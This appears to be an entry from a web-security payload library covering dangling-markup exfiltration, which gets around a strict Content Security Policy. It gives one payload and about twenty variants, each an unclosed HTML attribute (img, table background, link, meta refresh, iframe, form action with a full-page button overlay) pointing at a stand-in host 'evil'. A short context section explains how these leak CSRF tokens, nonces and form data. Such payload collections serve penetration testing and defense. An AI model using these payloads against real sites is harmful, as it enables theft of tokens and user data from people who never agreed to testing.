---
title: Dangling Markup Exfiltration (CSP-safe)
slug: dangling-markup-exfil
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/html-injection, sink/dangling-markup, sink/exfil]
inbound: []
---

# Dangling Markup Exfiltration (CSP-safe)

## Payload

```html
<img src="//evil?
```

## Variants

```html
<body background="//evil?
<table background="//evil?
<table><thead background="//evil?
<table><tbody background="//evil?
<table><tfoot background="//evil?
<table><td background="//evil?
<table><th background="//evil?
<link rel=stylesheet href="//evil?
<link rel=icon href="//evil?
<meta http-equiv="refresh" content="0; http://evil?
<image src="//evil?
<video><track default src="//evil?
<video><source src="//evil?
<audio><source src="//evil?
<input type=image src="//evil?
<form><button style="width:100%;height:100%" type=submit formaction="//evil?
<form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil?
<button form=x style="width:100%;height:100%;"><form id=x action="//evil?
<object data="//evil?
<iframe src="//evil?
<embed src="//evil?
```

## Context

When a strict CSP blocks all script execution but allows HTML injection, an unclosed resource attribute (`src="//evil?`) causes the browser to fetch a URL that includes subsequent page content (up to the next `"` character) as part of the query string or path, exfiltrating CSRF tokens, nonces, and form data. `<meta refresh>` is not covered by `default-src` in all browsers. `background` attribute variants work in older browsers. `formaction`/`action` with full-width button overlays the page to capture clicks. Requires no JavaScript execution — pure HTML injection sink.

## Provenance

- Distilled from: `../../techniques/dom-xss/scriptless-attacks.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Scriptless Attacks](../../techniques/dom-xss/scriptless-attacks.md)
